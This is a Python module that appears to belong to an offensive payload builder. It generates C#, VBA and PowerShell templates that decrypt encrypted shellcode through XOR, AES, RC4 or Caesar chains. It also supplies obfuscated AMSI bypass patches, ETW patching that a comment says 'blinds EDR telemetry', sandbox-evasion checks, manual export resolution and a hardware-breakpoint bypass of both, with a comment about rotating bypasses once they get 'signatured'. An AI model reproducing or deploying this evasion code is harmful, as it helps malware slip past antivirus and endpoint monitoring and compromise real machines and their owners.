# Decryption routines per (encryption method x target language).
# Each snippet expects specific variable names:
#   input:  _mf_in   (or 'enc' for first step)
#   output: _mf_out  (or 'buf' for last step)
# The chain builders handle renaming.

# --- C# decryption snippets

_CS_XOR = '''            byte[] {out_var} = new byte[{in_var}.Length];
            byte[] _mfk{s} = new byte[] {{ {key} }};
            for (int _i{s} = 0; _i{s} < {in_var}.Length; _i{s}++)
                {out_var}[_i{s}] = (byte)({in_var}[_i{s}] ^ _mfk{s}[_i{s} % _mfk{s}.Length]);'''

_CS_AES = '''            byte[] {out_var};
            using (Aes _mfa{s} = Aes.Create())
            {{
                _mfa{s}.KeySize = 256; _mfa{s}.BlockSize = 128;
                _mfa{s}.Padding = PaddingMode.PKCS7; _mfa{s}.Mode = CipherMode.CBC;
                _mfa{s}.Key = new byte[] {{ {key} }};
                _mfa{s}.IV = new byte[] {{ {iv} }};
                using (ICryptoTransform _mfd{s} = _mfa{s}.CreateDecryptor())
                    {out_var} = _mfd{s}.TransformFinalBlock({in_var}, 0, {in_var}.Length);
            }}'''

_CS_RC4 = '''            int[] _mfS{s} = new int[256];
            for (int _i{s} = 0; _i{s} < 256; _i{s}++) _mfS{s}[_i{s}] = _i{s};
            byte[] _mfrk{s} = new byte[] {{ {key} }};
            int _j{s} = 0;
            for (int _i{s} = 0; _i{s} < 256; _i{s}++)
            {{
                _j{s} = (_j{s} + _mfS{s}[_i{s}] + _mfrk{s}[_i{s} % _mfrk{s}.Length]) % 256;
                int _t{s} = _mfS{s}[_i{s}]; _mfS{s}[_i{s}] = _mfS{s}[_j{s}]; _mfS{s}[_j{s}] = _t{s};
            }}
            byte[] {out_var} = new byte[{in_var}.Length];
            int _a{s} = 0, _b{s} = 0;
            for (int _i{s} = 0; _i{s} < {in_var}.Length; _i{s}++)
            {{
                _a{s} = (_a{s} + 1) % 256;
                _b{s} = (_b{s} + _mfS{s}[_a{s}]) % 256;
                int _t{s} = _mfS{s}[_a{s}]; _mfS{s}[_a{s}] = _mfS{s}[_b{s}]; _mfS{s}[_b{s}] = _t{s};
                {out_var}[_i{s}] = (byte)({in_var}[_i{s}] ^ _mfS{s}[(_mfS{s}[_a{s}] + _mfS{s}[_b{s}]) % 256]);
            }}'''

_CS_CAESAR = '''            byte[] {out_var} = new byte[{in_var}.Length];
            for (int _i{s} = 0; _i{s} < {in_var}.Length; _i{s}++)
                {out_var}[_i{s}] = (byte)(({in_var}[_i{s}] - {shift} + 256) % 256);'''



# VBA decryption snippets

_VBA_XOR = '''    Dim {out_var}() As Byte
    ReDim {out_var}(UBound({in_var}))
    Dim _mfk{s} As Variant
    _mfk{s} = Array({key})
    Dim _i{s} As Long
    For _i{s} = 0 To UBound({in_var})
        {out_var}(_i{s}) = {in_var}(_i{s}) Xor _mfk{s}(_i{s} Mod (UBound(_mfk{s}) + 1))
    Next'''

_VBA_CAESAR = '''    Dim {out_var}() As Byte
    ReDim {out_var}(UBound({in_var}))
    Dim _i{s} As Long
    For _i{s} = 0 To UBound({in_var})
        {out_var}(_i{s}) = ({in_var}(_i{s}) - {shift} + 256) Mod 256
    Next'''



_PS_XOR = '''[byte[]]${out_var} = New-Object byte[] ${in_var}.Length
[byte[]]$_mfk{s} = {key}
for ($_i{s} = 0; $_i{s} -lt ${in_var}.Length; $_i{s}++) {{
    ${out_var}[$_i{s}] = ${in_var}[$_i{s}] -bxor $_mfk{s}[$_i{s} % $_mfk{s}.Length]
}}'''

_PS_AES = '''$_mfa{s} = [System.Security.Cryptography.Aes]::Create()
$_mfa{s}.KeySize = 256; $_mfa{s}.BlockSize = 128
$_mfa{s}.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$_mfa{s}.Mode = [System.Security.Cryptography.CipherMode]::CBC
$_mfa{s}.Key = {key}
$_mfa{s}.IV = {iv}
$_mfd{s} = $_mfa{s}.CreateDecryptor()
[byte[]]${out_var} = $_mfd{s}.TransformFinalBlock(${in_var}, 0, ${in_var}.Length)
$_mfd{s}.Dispose(); $_mfa{s}.Dispose()'''

_PS_RC4 = '''[int[]]$_mfS{s} = 0..255
[byte[]]$_mfrk{s} = {key}
$_j{s} = 0
for ($_i{s} = 0; $_i{s} -lt 256; $_i{s}++) {{
    $_j{s} = ($_j{s} + $_mfS{s}[$_i{s}] + $_mfrk{s}[$_i{s} % $_mfrk{s}.Length]) % 256
    $_t{s} = $_mfS{s}[$_i{s}]; $_mfS{s}[$_i{s}] = $_mfS{s}[$_j{s}]; $_mfS{s}[$_j{s}] = $_t{s}
}}
[byte[]]${out_var} = New-Object byte[] ${in_var}.Length
$_a{s} = 0; $_b{s} = 0
for ($_i{s} = 0; $_i{s} -lt ${in_var}.Length; $_i{s}++) {{
    $_a{s} = ($_a{s} + 1) % 256; $_b{s} = ($_b{s} + $_mfS{s}[$_a{s}]) % 256
    $_t{s} = $_mfS{s}[$_a{s}]; $_mfS{s}[$_a{s}] = $_mfS{s}[$_b{s}]; $_mfS{s}[$_b{s}] = $_t{s}
    ${out_var}[$_i{s}] = ${in_var}[$_i{s}] -bxor $_mfS{s}[($_mfS{s}[$_a{s}] + $_mfS{s}[$_b{s}]) % 256]
}}'''

_PS_CAESAR = '''[byte[]]${out_var} = New-Object byte[] ${in_var}.Length
for ($_i{s} = 0; $_i{s} -lt ${in_var}.Length; $_i{s}++) {{
    ${out_var}[$_i{s}] = [byte]((${in_var}[$_i{s}] - {shift} + 256) % 256)
}}'''


# hack: this bypass gets signatured every few months, needs rotation
_CS_AMSI = '''            IntPtr _amLib = LoadLibrary("am" + "si" + ".dll");
            IntPtr _amAddr = GetProcAddress(_amLib, "Am" + "si" + "Sc" + "anBu" + "ffer");
            uint _amOld;
            VirtualProtect(_amAddr, 6, 0x40, out _amOld);
            byte[] _amPatch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(_amPatch, 0, _amAddr, _amPatch.Length);
            VirtualProtect(_amAddr, 6, _amOld, out _amOld);'''

# extra P/Invoke imports needed when AMSI/ETW bypass is used
# VirtualProtect is NOT declared here -- the template already has it
_CS_AMSI_IMPORTS = '''
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
'''

_VBA_AMSI = '''    Dim _amH As LongPtr: _amH = LoadLibrary("am" & "si.dll")
    Dim _amA As LongPtr: _amA = GetProcAddress(_amH, "Am" & "siSc" & "anBu" & "ffer")
    Dim _amO As Long
    VirtualProtect _amA, 6, &H40, _amO
    Dim _amP(0 To 5) As Byte
    _amP(0) = &HB8: _amP(1) = &H57: _amP(2) = &H0: _amP(3) = &H7: _amP(4) = &H80: _amP(5) = &HC3
    CopyMemory _amA, _amP(0), 6
    VirtualProtect _amA, 6, _amO, _amO'''

_PS_AMSI = '''$_amT = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')
$_amF = $_amT.GetField('amsi' + 'Init' + 'Failed', 'NonPublic,Static')
$_amF.SetValue($null, $true)'''



# Sandbox evasion

_CS_SANDBOX = '''            DateTime _sbT = DateTime.Now;
            Sleep(2000);
            if (DateTime.Now.Subtract(_sbT).TotalSeconds < 1.5) return;'''

_VBA_SANDBOX = '''    Dim _sbT As Double: _sbT = Timer
    Application.Wait (Now + TimeValue("00:00:02"))
    If Timer - _sbT < 1.5 Then Exit Sub'''


# ETW -- patch EtwEventWrite to ret, blinds EDR telemetry
_CS_ETW = '''            IntPtr _etwLib = LoadLibrary("nt" + "dll" + ".dll");
            IntPtr _etwAddr = GetProcAddress(_etwLib, "Etw" + "Event" + "Write");
            uint _etwOld;
            VirtualProtect(_etwAddr, 1, 0x40, out _etwOld);
            Marshal.Copy(new byte[] { 0xC3 }, 0, _etwAddr, 1);
            VirtualProtect(_etwAddr, 1, _etwOld, out _etwOld);'''

_PS_ETW = '''$_etwM = [System.Runtime.InteropServices.Marshal]
$_etwT = Add-Type -MemberDefinition @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
"@ -Name "_EtwP" -PassThru
$_etwH = $_etwT::LoadLibrary("nt" + "dll")
$_etwA = $_etwT::GetProcAddress($_etwH, "Etw" + "Event" + "Write")
$_etwO = 0
$_etwT::VirtualProtect($_etwA, [UIntPtr]1, 0x40, [ref]$_etwO) | Out-Null
$_etwM::WriteByte($_etwA, 0xC3)
$_etwT::VirtualProtect($_etwA, [UIntPtr]1, $_etwO, [ref]$_etwO) | Out-Null'''



def _fmt_cs(data):
    return ','.join(f'0x{b:02x}' for b in data)

def _fmt_vba(data):
    return ','.join(str(b) for b in data)

def _fmt_ps(data):
    return ','.join(f'0x{b:02x}' for b in data)


_CS_SNIPPETS = {'xor': _CS_XOR, 'aes': _CS_AES, 'rc4': _CS_RC4, 'caesar': _CS_CAESAR}
_VBA_SNIPPETS = {'xor': _VBA_XOR, 'caesar': _VBA_CAESAR}
_PS_SNIPPETS = {'xor': _PS_XOR, 'aes': _PS_AES, 'rc4': _PS_RC4, 'caesar': _PS_CAESAR}


def _build_chain(meta_chain, snippets, fmt_fn):
    """Generic chain builder. Reverses the chain and composes decryption
    snippets with proper variable naming."""
    if not meta_chain or meta_chain[0]['method'] == 'none':
        return ''  # no encryption, raw shellcode in 'buf' directly

    steps = list(reversed(meta_chain))
    blocks = []

    for idx, meta in enumerate(steps):
        m = meta['method']
        tpl = snippets.get(m)
        if tpl is None:
            raise ValueError(f'no {m} decrypt snippet for this language')

        # variable naming: first reads from 'enc', last writes to 'buf'
        if len(steps) == 1:
            in_var, out_var = 'enc', 'buf'
        elif idx == 0:
            in_var, out_var = 'enc', f'_mf_s{idx}'
        elif idx == len(steps) - 1:
            in_var, out_var = f'_mf_s{idx - 1}', 'buf'
        else:
            in_var, out_var = f'_mf_s{idx - 1}', f'_mf_s{idx}'

        kwargs = {'in_var': in_var, 'out_var': out_var, 's': idx}

        if m == 'xor':
            kwargs['key'] = fmt_fn(meta['xor_key'])
        elif m == 'aes':
            kwargs['key'] = fmt_fn(meta['aes_key'])
            kwargs['iv'] = fmt_fn(meta['aes_iv'])
        elif m == 'rc4':
            kwargs['key'] = fmt_fn(meta['rc4_key'])
        elif m == 'caesar':
            kwargs['shift'] = meta['caesar_shift']

        blocks.append(tpl.format(**kwargs))

    return '\n'.join(blocks)


def build_chain_cs(meta_chain):
    return _build_chain(meta_chain, _CS_SNIPPETS, _fmt_cs)

def build_chain_vba(meta_chain):
    return _build_chain(meta_chain, _VBA_SNIPPETS, _fmt_vba)

def build_chain_ps(meta_chain):
    return _build_chain(meta_chain, _PS_SNIPPETS, _fmt_ps)


def needs_aes_imports(meta_chain):
    """Check if any step uses AES (need using System.Security.Cryptography)."""
    return any(m['method'] == 'aes' for m in meta_chain)

def get_amsi_cs(enabled):
    return _CS_AMSI if enabled else ''

def get_amsi_imports_cs(enabled):
    return _CS_AMSI_IMPORTS if enabled else ''

def get_amsi_vba(enabled):
    return _VBA_AMSI if enabled else ''

def get_amsi_ps(enabled):
    return _PS_AMSI if enabled else ''

def get_sandbox_cs(enabled):
    return _CS_SANDBOX if enabled else ''

def get_sandbox_vba(enabled):
    return _VBA_SANDBOX if enabled else ''

def get_etw_cs(enabled):
    return _CS_ETW if enabled else ''

def get_etw_ps(enabled):
    return _PS_ETW if enabled else ''

# --- 2026 Stealth Snippets

_CS_D_INVOKE_CLASS = '''
    public static class _mfd
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        public static T _mfg<T>(string _mfl, string _mff) where T : Delegate
        {
            IntPtr _mfh = GetModuleHandle(_mfl);
            IntPtr _mfa = _mfp(_mfh, _mff);
            return (T)Marshal.GetDelegateForFunctionPointer(_mfa, typeof(T));
        }

        public static IntPtr _mfp(IntPtr _mfm, string _mfn)
        {
            int _mfi = 0;
            IntPtr _mfe = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfm.ToInt64() + 0x3C)) + 0x88)));
            int _mfc = Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x18));
            IntPtr _mfna = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x20)));
            IntPtr _mfoo = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x24)));
            IntPtr _mfea = (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfe.ToInt64() + 0x1C)));
            for (_mfi = 0; _mfi < _mfc; _mfi++)
            {
                string _mfs = Marshal.PtrToStringAnsi((IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfna.ToInt64() + _mfi * 4))));
                if (_mfs.Equals(_mfn, StringComparison.OrdinalIgnoreCase))
                {
                    return (IntPtr)(_mfm.ToInt64() + Marshal.ReadInt32((IntPtr)(_mfea.ToInt64() + Marshal.ReadInt16((IntPtr)(_mfoo.ToInt64() + _mfi * 2)) * 4)));
                }
            }
            return IntPtr.Zero;
        }
    }
'''

_CS_HWBP_BYPASS_CLASS = '''
    public static class _mfs
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint _mff, IntPtr _mfa);
        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr _mfh, ref _mfc _mfx);
        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr _mfh, ref _mfc _mfx);

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct _mfc { 
            public ulong P1, P2, P3, P4, P5, P6; 
            public uint ContextFlags; 
            public uint MxCsr; 
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs; 
            public uint EFlags; 
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7; 
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip; 
        }

        private static IntPtr _amA;
        private static IntPtr _etwA;

        public static void SetupBypass() {
            IntPtr _amL = _mfd.GetModuleHandle("am" + "si.dll");
            _amA = _mfd._mfp(_amL, "Am" + "siSc" + "anBu" + "ffer");
            IntPtr _etwL = _mfd.GetModuleHandle("nt" + "dll.dll");
            _etwA = _mfd._mfp(_etwL, "Etw" + "Event" + "Write");
            
            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate((_mfvh)Handler));
            
            _mfc _ctx = new _mfc(); _ctx.ContextFlags = 0x10010; // CONTEXT_DEBUG_REGISTERS
            GetThreadContext((IntPtr)(-2), ref _ctx);
            _ctx.Dr0 = (ulong)_amA;
            _ctx.Dr1 = (ulong)_etwA;
            _ctx.Dr7 = 0x5; // Break on execution for Dr0 and Dr1
            SetThreadContext((IntPtr)(-2), ref _ctx);
        }

        private delegate long _mfvh(IntPtr _mfe);
        private static long Handler(IntPtr _mfe) {
            if (Marshal.ReadInt32(_mfe) == unchecked((int)0x80000004)) {
                IntPtr _ctxP = Marshal.ReadIntPtr((IntPtr)(_mfe.ToInt64() + 8));
                ulong _rip = (ulong)Marshal.ReadInt64((IntPtr)(_ctxP.ToInt64() + 0xF8)); // Rip
                if (_rip == (ulong)_amA) {
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0x78), 0); // Rax = CLEAN
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0xF8), (long)_rip + 3);
                    return -1;
                }
                if (_rip == (ulong)_etwA) {
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0x78), 0);
                    Marshal.WriteInt64((IntPtr)(_ctxP.ToInt64() + 0xF8), (long)_rip + 3);
                    return -1;
                }
            }
            return 0;
        }
    }
'''

_CS_SANDBOX_2026 = '''
            if (Environment.ProcessorCount < 2) return;
            if (System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName.Length == 0) return;
            // check for common sandbox files/processes
            if (System.IO.File.Exists("C:\\\\\\\\windows\\\\\\\\system32\\\\\\\\Drivers\\\\\\\\VBoxMouse.sys")) return;
'''

def get_stealth_cs():
    return _CS_D_INVOKE_CLASS + _CS_HWBP_BYPASS_CLASS

def get_sandbox_2026(enabled):
    return _CS_SANDBOX_2026 if enabled else ''

